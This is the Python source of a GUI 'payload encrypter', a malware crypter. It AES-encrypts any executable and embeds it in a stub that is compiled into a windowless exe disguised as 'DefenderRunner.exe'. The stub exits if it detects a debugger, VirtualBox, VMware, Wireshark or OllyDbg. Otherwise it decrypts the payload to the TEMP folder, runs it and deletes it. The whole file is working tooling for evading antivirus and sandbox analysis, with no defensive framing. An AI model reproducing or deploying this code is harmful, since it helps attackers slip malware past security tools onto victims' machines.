import os
import sys
import random
import string
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.backends import default_backend
import customtkinter as ctk
from tkinter import filedialog
from tkinter import messagebox
import subprocess
import base64
import secrets
import ctypes
import threading

# Function to generate a random file name
def generate_random_filename(length=16):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

# Generate a strong key with PBKDF2
def generate_encryption_key(password: str):
    salt = secrets.token_bytes(16)
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100000,
        backend=default_backend()
    )
    key = kdf.derive(password.encode())
    return key, salt

# Function to encrypt the payload and create a runnable EXE
def encrypt_payload(payload_path, output_folder, progress_callback):
    password = ''.join(secrets.choice(string.ascii_letters + string.digits) for _ in range(32))
    key, salt = generate_encryption_key(password)

    # Read the payload
    with open(payload_path, 'rb') as file:
        payload = file.read()

    # Encrypt the payload with AES
    iv = secrets.token_bytes(16)
    cipher = Cipher(algorithms.AES(key), modes.CFB(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    encrypted_payload = encryptor.update(payload) + encryptor.finalize()

    # Encode the encrypted payload, key, and salt in base64 to embed them in the stub
    encoded_payload = base64.b64encode(encrypted_payload).decode('utf-8')
    encoded_iv = base64.b64encode(iv).decode('utf-8')
    encoded_salt = base64.b64encode(salt).decode('utf-8')

    # Generate EXE output file path
    output_filename = os.path.join(output_folder, "DefenderRunner.exe")

    # Create the stub script for decryption and execution
    stub_code = f"""
import os
import sys
import base64
import ctypes
import subprocess
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.backends import default_backend
import secrets

# Anti-Debugging and Anti-VM Checks
def detect_debuggers_and_vm():
    suspicious_processes = ["vboxservice.exe", "vmware.exe", "xenservice.exe", "wireshark.exe", "ollydbg.exe"]
    running_processes = os.popen('tasklist').read().lower()
    for process in suspicious_processes:
        if process in running_processes:
            sys.exit()
    if ctypes.windll.kernel32.IsDebuggerPresent():
        sys.exit()

# Dynamic Decryption Logic
def decrypt_and_execute():
    detect_debuggers_and_vm()
    encrypted_payload = base64.b64decode("{encoded_payload}")
    iv = base64.b64decode("{encoded_iv}")
    salt = base64.b64decode("{encoded_salt}")
    password = "{password}"

    # Rebuild the key dynamically
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100000,
        backend=default_backend()
    )
    key = kdf.derive(password.encode())

    # Decrypt the payload
    cipher = Cipher(algorithms.AES(key), modes.CFB(iv), backend=default_backend())
    decryptor = cipher.decryptor()
    decrypted_payload = decryptor.update(encrypted_payload) + decryptor.finalize()

    # Write the decrypted payload to a temporary file and execute it
    temp_file = os.path.join(os.getenv("TEMP"), "decrypted_payload.exe")
    with open(temp_file, "wb") as file:
        file.write(decrypted_payload)
    subprocess.run([temp_file], shell=True)
    os.remove(temp_file)

if __name__ == "__main__":
    decrypt_and_execute()
"""

    # Save the stub to a temporary Python file
    stub_file = os.path.join(output_folder, generate_random_filename() + '_stub.py')
    with open(stub_file, 'w') as file:
        file.write(stub_code)

    # Compile the stub into an executable
    try:
        progress_callback(50)  # 50% Progress
        subprocess.run(['pyinstaller', '--onefile', '--noconsole', stub_file], check=True)
        # Move the generated EXE to the final output location
        dist_folder = os.path.join(output_folder, 'dist')
        generated_exe = os.path.join(dist_folder, os.path.basename(stub_file).replace('.py', '.exe'))
        os.rename(generated_exe, output_filename)

        # Clean up temporary files
        os.remove(stub_file)
        for folder in ['build', 'dist', '__pycache__']:
            temp_folder = os.path.join(output_folder, folder)
            if os.path.exists(temp_folder):
                subprocess.run(['rm', '-rf', temp_folder], shell=True)

        progress_callback(100)  # 100% Progress
        messagebox.showinfo("Success", f"Encrypted EXE saved to: {output_filename}")

    except Exception as e:
        messagebox.showerror("Error", f"Failed to generate EXE: {str(e)}")

# GUI Setup
def select_file():
    file_path = filedialog.askopenfilename(filetypes=[("All Files", "*.*")])
    if file_path:
        output_folder = filedialog.askdirectory(title="Select Output Folder")
        if not output_folder:
            messagebox.showerror("Error", "No output folder selected.")
            return

        # Show progress bar in a new window
        progress_window = ctk.CTkToplevel()
        progress_window.title("Processing")
        progress_window.geometry("400x150")
        progress_label = ctk.CTkLabel(progress_window, text="Processing your file...", font=("Arial", 16))
        progress_label.pack(pady=20)
        progress_bar = ctk.CTkProgressBar(progress_window, orientation="horizontal", mode="determinate", width=300)
        progress_bar.pack(pady=10)
        progress_bar.set(0)

        def update_progress(value):
            progress_bar.set(value / 100)

        # Run encryption in a separate thread
        def process():
            try:
                encrypt_payload(file_path, output_folder, update_progress)
            finally:
                progress_window.destroy()

        threading.Thread(target=process).start()

# Main GUI Setup
root = ctk.CTk()
root.title("File Payload Encrypter")
root.geometry("500x300")

label = ctk.CTkLabel(root, text="Select a file to encrypt:")
label.pack(pady=10)

select_file_button = ctk.CTkButton(root, text="Browse", command=select_file)
select_file_button.pack(pady=20)

root.mainloop()